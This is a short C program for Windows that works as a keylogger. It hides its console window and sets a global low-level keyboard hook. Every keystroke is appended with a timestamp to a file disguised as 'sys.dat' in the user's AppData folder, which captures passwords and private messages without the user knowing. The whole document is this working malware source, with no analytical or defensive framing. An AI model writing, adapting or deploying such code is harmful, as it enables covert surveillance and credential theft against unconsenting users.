#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <shlobj.h>

HHOOK hook;

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (p->vkCode == VK_ESCAPE) {
            UnhookWindowsHookEx(hook);
            PostQuitMessage(0);
            return 0;
        }

        char path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
            strcat(path, "\\sys.dat");
            FILE* fp = fopen(path, "a+");
            if (fp) {
                time_t now = time(NULL);
                struct tm* t = localtime(&now);
                fprintf(fp, "[%02d-%02d-%02d %02d:%02d:%02d] Key: %c (VK: %d)\n",
                        t->tm_mday, t->tm_mon + 1, t->tm_year % 100,
                        t->tm_hour, t->tm_min, t->tm_sec,
                        MapVirtualKeyA(p->vkCode, MAPVK_VK_TO_CHAR),
                        p->vkCode);
                fclose(fp);
            }
        }
    }
    return CallNextHookEx(hook, code, wParam, lParam);
}

int main() {
    FreeConsole();
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) return 1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

